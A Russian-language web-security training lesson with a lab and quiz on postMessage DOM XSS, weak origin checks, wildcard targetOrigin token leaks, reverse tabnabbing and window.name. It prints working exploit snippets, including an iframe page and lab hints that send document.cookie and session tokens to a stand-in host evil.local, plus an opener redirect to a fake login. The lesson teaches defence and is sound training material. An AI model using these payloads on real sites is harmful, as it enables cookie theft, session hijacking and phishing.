---
id: web-postmessage-tabnabbing
title: "postMessage и tabnabbing: атаки на межоконное взаимодействие"
category: web
parent: web-browser-core
difficulty: medium
order: 4
tags: [postmessage, tabnabbing, opener, xss, client-side]
prerequisites: [web-same-origin-cors, web-browser-security]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 50
summary: "Как ошибки в postMessage и reverse tabnabbing позволяют перехватить окно жертвы, подменить страницу и украсть данные."
lab:
  kind: shell
  title: "Практика: DOM XSS через postMessage без проверки origin"
  toolset: [core, curl]
  workdir: /home/student/task
  files: [task.md, widget.js]
  check: "grep -q 'postMessage' exploit.html && grep -q 'nto{' found.txt"
  hints:
    - "Прочитай widget.js: обработчик message пишет e.data в innerHTML и НЕ проверяет e.origin."
    - "Собери exploit.html: iframe на victim.com/widget и postMessage с payload."
    - "Payload: <img src=x onerror=fetch('https://evil.local/?c='+document.cookie)>"
    - "Забери перехваченное: curl -s 'https://evil.local/steal' > found.txt"

---

## Вопрос, с которого всё начинается

На сайте есть виджет чата, встроенный на другие страницы через `<iframe>`. Страницы общаются с виджетом через **`postMessage`** — механизм, позволяющий окнам и фреймам обмениваться сообщениями даже с разных origin.

И тут вопрос: а проверяет ли виджет, **откуда** пришло сообщение? Если нет — любой сайт, встроивший виджет в iframe, может отправить в него произвольные данные, вплоть до выполнения кода. Такие баги не видны в HTTP-запросах и не ловятся обычными сканерами. Сегодня разберём оба вектора: `postMessage` и tabnabbing.

## Наш пример: виджет чата

Наш виджет живёт на `victim.com/widget`. Он слушает сообщения так:

```js
window.addEventListener('message', (e) => {
  document.getElementById('out').innerHTML = e.data;
});
```

`addEventListener('message', ...)` — обработчик входящих сообщений. **Ошибка здесь в том, что `e.origin` не проверяется вообще.** Значит, любой сайт, открывший виджет в iframe, может отправить в него что угодно.

## Шаг 1: DOM XSS через postMessage

Проверим обработчик: если он пишет `e.data` в `innerHTML` без проверки origin — это DOM XSS. Собираем страницу-эксплойт:

```html
<iframe src="https://victim.com/widget" id="f"></iframe>
<script>
document.getElementById('f').onload = () => {
  document.getElementById('f').contentWindow.postMessage(
    '<img src=x onerror=fetch("https://evil.local/?c="+document.cookie)>', '*');
};
</script>
```

`contentWindow.postMessage(data, '*')` отправляет данные в окно iframe. Обработчик виджета кладёт их в `innerHTML`, тег `<img>` с `onerror` исполняется — и cookie утекает на `evil.local`. Артефакт — данные жертвы на нашем сервере.

Опасные sink'и, которые часто стоят за приёмником: `eval(e.data)` (критично), `location = e.data` (открытый редирект), `document.write(e.data)` (XSS).

## Шаг 2: неверная проверка origin

Проверка есть — но слабая. Это тоже уязвимость:

```js
if (e.origin.indexOf('victim.com') !== -1) { /* evil-victim.com пройдёт */ }
if (e.origin.startsWith('https://victim.com')) { /* victim.com.evil.com пройдёт */ }
if (e.source === parent) { /* origin не проверен вовсе */ }
```

Байпас-варианты origin для таких проверок: `https://victim.com.evil.com`, `https://evil-victim.com`, `https://evil.com/victim.com`, `null`, `http://victim.com`. Правильно — только строгое сравнение `e.origin === 'https://trusted.com'`.

## Шаг 3: `targetOrigin: '*'` при отправке

Ошибка бывает и на стороне **отправителя**. Если приложение само шлёт данные с `'*'`, они уходят в **любое** окно, включая враждебное:

```js
otherWindow.postMessage({token: sessionToken}, '*');   // токен утёк
```

Атакующий открывает приложение и слушает:

```js
window.addEventListener('message', e => fetch('https://evil.local/?t='+e.data.token));
```

Токен утекает даже без XSS — только из-за широкого `targetOrigin`.

## Шаг 4: reverse tabnabbing

Второй вектор — злоупотребление `window.opener`. Когда сайт открывает внешнюю ссылку через `target="_blank"` **без** `rel="noopener"`, новая страница получает доступ к окну-источнику:

```html
<a href="https://evil.local" target="_blank">Открыть</a>
```

На `evil.local` достаточно одной строки:

```js
if (window.opener) window.opener.location = 'https://evil.local/fake-login';
```

Пользователь вернётся на исходную вкладку, а там — фейковая форма логина. Это **reverse tabnabbing**. Защита — `rel="noopener noreferrer"` или `window.open(url, '_blank', 'noopener')`, а также заголовок `COOP: same-origin`.

## Шаг 5: window.name

Ещё один канал. Свойство `window.name` **сохраняется между навигациями** и может переносить данные между origin'ами. Если приложение читает `window.name` и вставляет в DOM — это XSS:

```js
const data = window.name;         // переживает переходы
document.getElementById('x').innerHTML = data;
```

## Если не сработало

- Обработчик проверяет `e.origin === 'null'` — это тоже уязвимость: `null` приходит из sandbox/data-URL.
- Проверка по `e.source`, а не по origin — не защита: атакующий строит нужную цепочку окон.
- Сообщение приходит из вложенного iframe с другим origin — проверяй всю цепочку, а не только верхний документ.
- Service Worker перехватывает сообщения — проверь, не обрабатывает ли он `message` без проверки origin.

## Как искать системно

Первый шаг — собрать весь JavaScript приложения и найти точки, где оно слушает или отправляет сообщения. `postMessage` и `addEventListener('message')` — редкие строки, их легко выхватить грепом:

```bash
$ katana -u https://victim.com -jc -d 3 -silent | grep -E '\.js' | sort -u > js.txt
$ while read u; do curl -s "$u"; done < js.txt | grep -nE "postMessage|addEventListener\(.message"
```

Дальше — отдельно обработчики **без** проверки origin:

```bash
$ while read u; do curl -s "$u"; done < js.txt | grep -A4 "addEventListener('message'" | grep -v "e.origin"
```

И внешние ссылки без `noopener`:

```bash
$ curl -s https://victim.com/ | grep -oE '<a [^>]*target="_blank"[^>]*>' | grep -v noopener
```

Второй шаг — проверить каждую находку руками: для приёмника — iframe + `postMessage`, для отправителя — `window.open` + свой listener, для ссылки — подмена `opener.location`.

## Защита и как её обходят

Правильная защита состоит из трёх частей: при приёме — строгая проверка `e.origin === 'https://trusted.com'`; при отправке — конкретный `targetOrigin`, а не `'*'`; для внешних ссылок — `rel="noopener noreferrer"`. Обходят её тремя путями: находят обработчик вовсе без проверки, находят слабую проверку (`indexOf`/`startsWith`) или эксплуатируют доверенный, но скомпрометированный origin (поддомен с XSS, `null`-песочница).

## Оценка серьёзности

Оценивай находку по последствиям. DOM XSS через `postMessage` — критично (выполнение кода в контексте жертвы). Утечка токена через `targetOrigin: '*'` — тоже критично (захват сессии). Reverse tabnabbing — обычно средне, но в связке с фишингом может быть высоко. Чтение `window.name` без вставки в DOM — низко. Для каждого вектора нужна **минимальная HTML-страница**, воспроизводящая атаку, — это и есть доказательство для отчёта.

## Что мы теперь знаем

- `postMessage` обменивается сообщениями между окнами; приёмник обязан проверять `e.origin`.
- Без проверки origin — любой сайт шлёт данные в обработчик (вплоть до DOM XSS).
- `indexOf`/`startsWith` вместо `===` обходятся доменом-двойником.
- `targetOrigin: '*'` при отправке утекает данные любому окну.
- `target=_blank` без `noopener` даёт reverse tabnabbing (подмена исходной вкладки).
- `window.name` переносит данные между origin'ами и опасен при вставке в DOM.

## На что смотреть дальше

- Собирай JS и грепай `postMessage` и `addEventListener('message')` — это редкие строки.
- Проверяй строгость проверки: `===` с полным origin, а не `indexOf`/`startsWith`/`includes`.
- Проверяй отправителя: нет ли `postMessage(..., '*')` с токенами.
- Ищи все внешние `target="_blank"` без `rel="noopener"`.
- Оценивай импакт: DOM XSS и утечка токена — критично, tabnabbing — средне/высоко.
- Не путай `e.source` и `e.origin`: сравнение окна без сравнения origin защитой не является.
- Проверь Service Worker: если он обрабатывает `message`, к нему применимы те же правила.
- Не ограничивайся описанием «обработчик не проверяет origin» — покажи в PoC, что именно утекает и куда, иначе находку сложно оценить.

## Почему postMessage вообще существует

Политика **same-origin** запрещает скриптам с одного сайта читать содержимое
документа с другого. Это защищает cookie и DOM. Но иногда окнам **нужно** общаться
легально: попап OAuth должен передать токен родителю, виджет — сообщить о высоте,
встраивающая страница — управлять плеером. Для этого и придумали `postMessage`:
он позволяет **послать** сообщение в другое окно, не открывая доступ к его DOM.

Ключевое следствие: `postMessage` — это **явный, ручной канал** связи. Раз он
ручной, вся ответственность за проверку — на разработчике. Браузер не знает, какой
origin для вас «свой», и доставляет сообщение от кого угодно, кто получил ссылку на
ваше окно. Отсюда и весь класс багов: защита есть только там, где её написали.

## Три поля события: что и в каком порядке проверять

Обработчик `message` получает объект события с тремя важными полями. Их легко
перепутать, и путаница — источник половины ошибок:

| Поле | Что содержит | Можно ли доверять |
|---|---|---|
| `e.origin` | origin **отправителя** (`https://trusted.com`) | да, это защищённое поле |
| `e.source` | ссылка на окно-отправитель | не идентифицирует сайт |
| `e.data` | переданные данные | никогда не доверять |

Порядок проверки строгий: **сначала** `e.origin`, и только потом — данные. Если
проверять `e.source === parent`, вы убедитесь лишь, что сообщение пришло из
родительского фрейма, — но **какой** это сайт, неизвестно: любой сайт может
встроить вас в iframe и стать родителем. А `e.data` — это уже входные данные,
их нужно обрабатывать как недоверенные: не вставлять в `innerHTML`, не передавать
в `eval`, не использовать как URL без проверки.

## Попапы OAuth: где это бьёт больнее всего

Самый дорогой сценарий — окно входа. Классический поток: сайт открывает попап
провайдера, провайдер после входа шлёт `postMessage` с токеном обратно, родитель
закрывает попап. Если родитель проверяет origin слабо (`startsWith`, `indexOf`),
атакующий регистрирует `trusted-idp.evil.com` или `evil-trusted-idp.com` и шлёт
**свой** токен — или, наоборот, перехватывает чужой. Второй вариант: провайдер
отправляет токен с `targetOrigin: '*'`, и его получает любой, кто открыл попап.

Поэтому в аудите OAuth-попапов смотрите три вещи: строгость проверки `e.origin` у
родителя, точность `targetOrigin` у провайдера и то, не принимает ли родитель
токен из **любого** окна (`e.source` без проверки). Часто этого достаточно, чтобы
захватить сессию без единой XSS.

## Как правильно написать обработчик

Соберём безопасный вариант — он же служит чек-листом для аудита:

```js
const ALLOWED = 'https://widget.victim.com';
window.addEventListener('message', (e) => {
  if (e.origin !== ALLOWED) return;        // строгое сравнение, не indexOf
  if (typeof e.data !== 'string') return;  // проверка типа
  const el = document.getElementById('out');
  el.textContent = e.data;                 // textContent, а не innerHTML
});
```

Здесь нет ни одного из типовых промахов: origin сравнивается точно, тип данных
проверен, вывод идёт через `textContent` (экранирование). Именно эти три строки
ищут при ревью клиентского кода.

## Квиз

Проверь себя.

```quiz
- question: "Что обязан проверять получатель `message`?"
  options:
    - "`e.origin` по whitelist"
    - "`e.data` на длину"
    - "`document.cookie`"
    - "`navigator.userAgent`"
  answer: 0
  explanation: "Без проверки origin любой сайт может слать данные в обработчик."
- question: "Чем опасен `postMessage(secret, '*')`?"
  options:
    - "Секрет уйдёт любому окну, получившему ссылку"
    - "Он шифрует секрет"
    - "Он меняет cookie"
    - "Он замедляет сайт"
  answer: 0
  explanation: "`'*'` не ограничивает получателя."
- question: "Что такое reverse tabnabbing?"
  options:
    - "Новая вкладка через `window.opener` подменяет исходную страницу"
    - "Отравление DNS"
    - "SQL-инъекция"
    - "Отравление кэша"
  answer: 0
  explanation: "Без `rel='noopener'` открытая страница управляет исходной."
- question: "Как защититься от tabnabbing?"
  options:
    - "`rel='noopener'` (или COOP)"
    - "`HttpOnly`"
    - "`SameSite`"
    - "`nosniff`"
  answer: 0
  explanation: "`noopener` (и `COOP`) убирают доступ к `window.opener`."
- question: "Даже при верной проверке origin что может быть опасно?"
  options:
    - "Запись `e.data` в `innerHTML`"
    - "Проверка длины"
    - "Использование `postMessage`"
    - "Отправка `'*'` отправителем"
  answer: 0
  explanation: "Если отправитель скомпрометирован, `innerHTML` даст XSS."
```

## Куда дальше

В следующем уроке мы возьмём ещё один UI-вектор — **clickjacking** (`web-clickjacking`): как заставить жертву нажать на невидимую кнопку чужого сайта. А пока главное запомни: межоконное взаимодействие — отдельный класс клиентских дыр, который не виден в HTTP-трафике, но даёт полный контроль над окном жертвы.

## Где пригодится

- **CTF (Web):** задачи на iframe/postMessage-XSS и tabnabbing.
- **Bug bounty:** postMessage без проверки origin — частый клиентский баг.
- **Пентест:** аудит виджетов, OAuth-попапов, UGC-ссылок.
- **Работа (AppSec/Dev):** проверка origin, точный `targetOrigin`, `noopener`, COOP.
